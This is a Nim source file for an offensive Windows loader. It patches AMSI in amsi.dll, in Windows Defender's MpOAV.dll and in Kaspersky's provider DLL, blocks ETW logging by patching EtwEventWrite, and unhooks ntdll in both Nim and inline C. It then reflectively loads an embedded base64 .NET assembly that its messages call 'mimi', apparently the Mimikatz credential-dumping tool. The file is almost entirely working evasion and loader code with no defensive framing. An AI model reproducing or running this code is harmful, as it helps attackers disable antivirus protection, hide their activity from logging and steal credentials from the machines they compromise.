
import winim/clr
import strformat
import system
import strutils
import winim
import ptr_math
import winim/com
import winim/lean
import dynlib
import os, sequtils

const b64assembly = staticRead"download.dat"

var code = """
using System;
using System.Reflection;

public class Program
{
    public void Main()
    {
        Assembly assembly = Assembly.Load(Convert.FromBase64String("Properties.Resources.download"));
        Type type = assembly.GetType("KatzAssembly.ClassInteractive");
        object instanceOfMyType = Activator.CreateInstance(type);
    }
}

""".replaceWord("Properties.Resources.download",b64assembly)

when defined amd64:
    echo "[*] Running in x64 process"
    const patch:     array[1, byte] = [byte 0xc3]
    const patchamsi: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
    const patchv2:   array[6, byte] = [byte 0xb8, 0xff, 0xff, 0xff, 0xff, 0xC3]

elif defined i386:
    echo "[*] Running in x86 process"
    const patch:     array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]
    const patchamsi: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]

proc PatchAmsiDefender(): bool =
    var
        amsi: HMODULE
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false
 
    let filesInPath = toSeq(walkDir("C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\", relative=true))
    var length = len(filesInPath)
    # last dir == newest dir
    amsi = LoadLibrary(fmt"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\{filesInPath[length-1].path}\\MpOAV.dll")
    if amsi == 0:
        echo "[X] Failed to load MpOav.dll"
        return disabled
    cs = GetProcAddress(amsi,"DllGetClassObject")
    if cs == nil:
        echo "[X] Failed to get the address of 'DllGetClassObject'"
        return disabled

    if VirtualProtect(cs, patchamsi.len, 0x40, addr op):
        echo "[*] Applying patch"
        copyMem(cs, unsafeAddr patchamsi, patchamsi.len)
        VirtualProtect(cs, patchamsi.len, op, addr t)
        disabled = true
    return disabled

proc PatchAmsiScanBuffer(): bool =
    var
        amsi: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    amsi = loadLib("amsi")
    if isNil(amsi):
        echo "[X] Failed to load amsi.dll"
        return disabled

    cs = amsi.symAddr("AmsiScanBuffer") # equivalent of GetProcAddress()
    if isNil(cs):
        echo "[X] Failed to get the address of 'AmsiScanBuffer'"
        return disabled

    if VirtualProtect(cs, patchamsi.len, 0x40, addr op):
        echo "[*] Applying patch"
        copyMem(cs, unsafeAddr patchamsi, patchamsi.len)
        VirtualProtect(cs, patchamsi.len, op, addr t)
        disabled = true
    return disabled

proc PatchAmsiKES(): bool =
    var
        amsi: HMODULE
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false
 
    let filesInPath = toSeq(walkDir("c:\\Program Files (x86)\\Kaspersky Lab\\", relative=true))
    var length = len(filesInPath)
    # last dir == newest dir
    echo fmt"c:\\Program Files (x86)\\Kaspersky Lab\\{filesInPath[length-1].path}\\x64\\antimalware_provider.dll"
    amsi = LoadLibrary(fmt"c:\\Program Files (x86)\\Kaspersky Lab\\{filesInPath[length-1].path}\\x64\\antimalware_provider.dll")
    if amsi == 0:
        echo "[X] Failed to load antimalware_provider.dll"
        return disabled
    cs = GetProcAddress(amsi,"DllGetClassObject")
    if cs == nil:
        echo "[X] Failed to get the address of 'DllGetClassObject'"
        return disabled

    if VirtualProtect(cs, patchamsi.len, 0x40, addr op):
        echo "[*] Applying patch"
        copyMem(cs, unsafeAddr patchamsi, patchamsi.len)        
        disabled = VirtualProtect(cs, patchamsi.len, op, addr t)
    return disabled

proc PatchntdllEtwEventWrite(): bool =
    var
        ntdll: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    ntdll = loadLib("ntdll")
    if isNil(ntdll):
        echo "[X] Failed to load ntdll.dll"
        return disabled

    cs = ntdll.symAddr("EtwEventWrite") # equivalent of GetProcAddress()
    if isNil(cs):
        echo "[X] Failed to get the address of 'EtwEventWrite'"
        return disabled

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        echo "[*] Applying patch"
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        disabled = true
    return disabled

proc toString(bytes: openarray[byte]): string =
  result = newString(bytes.len)
  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

proc ntdllunhook(): bool =
  let low: uint16 = 0
  var 
      processH = GetCurrentProcess()
      mi : MODULEINFO
      ntdllModule = GetModuleHandleA("ntdll.dll")
      ntdllBase : LPVOID
      ntdllFile : FileHandle
      ntdllMapping : HANDLE
      ntdllMappingAddress : LPVOID
      hookedDosHeader : PIMAGE_DOS_HEADER
      hookedNtHeader : PIMAGE_NT_HEADERS
      hookedSectionHeader : PIMAGE_SECTION_HEADER

  GetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
  ntdllBase = mi.lpBaseOfDll
  ntdllFile = getOsFileHandle(open("C:\\windows\\system32\\ntdll.dll",fmRead))
  ntdllMapping = CreateFileMapping(ntdllFile, NULL, 16777218, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
  if ntdllMapping == 0:
    echo fmt"Could not create file mapping object ({GetLastError()})."
    return false
  ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
  if ntdllMappingAddress.isNil:
    echo fmt"Could not map view of file ({GetLastError()})."
    return false
  hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
  hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)
  for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
      hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
      if ".text" in toString(hookedSectionHeader.Name):
          var oldProtection : DWORD = 0
          if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, 0x40, addr oldProtection) == 0:#0x40 = PAGE_EXECUTE_READWRITE
            echo fmt"Failed calling VirtualProtect ({GetLastError()})."
            return false
          copyMem(ntdllBase + hookedSectionHeader.VirtualAddress, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize)
          if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, oldProtection, addr oldProtection) == 0:
            echo fmt"Failed resetting memory back to it's orignal protections ({GetLastError()})."
            return false  
  CloseHandle(processH)
  CloseHandle(ntdllFile)
  CloseHandle(ntdllMapping)
  FreeLibrary(ntdllModule)
  return true


{.emit: """

#include <windows.h>
#include <winternl.h>
#include <psapi.h>

int ntdllunhookc()
{
	HANDLE process = GetCurrentProcess();
	MODULEINFO mi;
	HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");

	GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
	LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
	HANDLE ntdllFile = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);

	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
			DWORD oldProtection = 0;
			VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
			memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
			VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
		}
	}

	CloseHandle(process);
	CloseHandle(ntdllFile);
	CloseHandle(ntdllMapping);
	FreeLibrary(ntdllModule);

	return FreeLibrary(ntdllModule);
}

""".}

proc unhookc(): int
    {.importc: "ntdllunhookc", nodecl.}


when isMainModule:
  MessageBox(0, fmt"[*] Click OK and i try to load mimi{'\n'}But first unhook all the stuff", "Nim is Powerful", 0)
  
  #MessageBox(0, "[*] Click OK and i try to unhook Ntdll", "Nim is Powerful", 0)
  #var success = ntdllunhook()
  #echo fmt"[*] unhook Ntdll: {bool(success)}"
  
  #MessageBox(0, fmt"[+] unhook Ntdll: {bool(success)}{'\n'}[*] Click OK and i try to block ETW by patch EtwEventWrite", "Nim is Powerful", 0)
  #var success = PatchntdllEtwEventWrite()
  #echo fmt"[*] ETW blocked by patch: {bool(success)}"
  #MessageBox(0, fmt"[+] ETW blocked by patch: {bool(success)}{'\n'}[*] Click OK and i try to disable AMSI", "Nim is Powerful", 0)

  var success = PatchAmsiKES()
  echo fmt"[+] AMSI KES disabled: {bool(success)}"
  MessageBox(0, fmt"[+] AMSI KES disabled: {bool(success)}{'\n'}[*] Click OK and i try to patch AMSI ScanBuffer", "Nim is Powerful", 0)

  #var success = PatchAmsiScanBuffer()
  #echo fmt"[*] AMSI ScanBuffer disabled: {bool(success)}"
  #MessageBox(0, fmt"[+] AMSI ScanBuffer disabled: {bool(success)}{'\n'}[*] Click OK and i try to load mimi", "Nim is Powerful", 0)

  #var success = unhookc()
  #echo fmt"[+] unhooc ntdll (С variant) disabled: {success}"
  #MessageBox(0, fmt"[+] unhooc ntdll (С variant) disabled: {success}{'\n'}[*] Click OK and i try to patch AMSI ScanBuffer", "Nim is Powerful", 0)

  echo "[*] Installed .NET versions"
  for v in clrVersions():
    echo fmt"    \--- {v}"
  echo "\n"

  var res = compile(code)
  var o = res.CompiledAssembly.new("Program")
  echo fmt"I compile class with mimi{'\n'}class = {o}{'\n'}Ready to execute"  
  MessageBox(0, fmt"I compile class with mimi{'\n'}class = {o}{'\n'}Ready to execute{'\n'}" , "Nim is Powerful", 0)

  o.Main()